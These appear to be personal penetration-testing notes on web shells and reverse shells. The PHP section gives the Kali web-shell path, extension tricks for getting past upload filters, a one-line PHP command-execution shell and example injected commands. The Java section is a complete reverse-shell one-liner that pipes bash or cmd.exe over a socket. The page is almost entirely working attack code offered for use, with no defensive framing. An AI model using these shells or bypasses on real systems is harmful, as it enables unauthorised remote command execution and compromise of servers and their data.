/usr/share/webshells/

[[Reverse Shell#Reverse shell cheat sheet]]

## PHP Reverse Shell
PHP reverse shell:
Open and edit IP and port
can change to different PHP if blocked (.php3, .phtml)
Can use burpsuite Intruder - sniper to check which are accepted

```
/usr/share/webshells/php/php-reverse-shell.php
```

Copy to current directory
```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

```
<?php
	echo system($_GET["cmd"]);
?>
```
Add to URL to file
```
?cmd=id;whoami;ls /var/www/;
```

- Stabilise if possible
[[Reverse Shell#Shell Stabalisation]]

## Java Reverse Shell
```
String host="localhost";

int port=8044;

		WINDOWS                     LINUX
String cmd="cmd.exe";   OR   String cmd="/bin/bash"; 

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```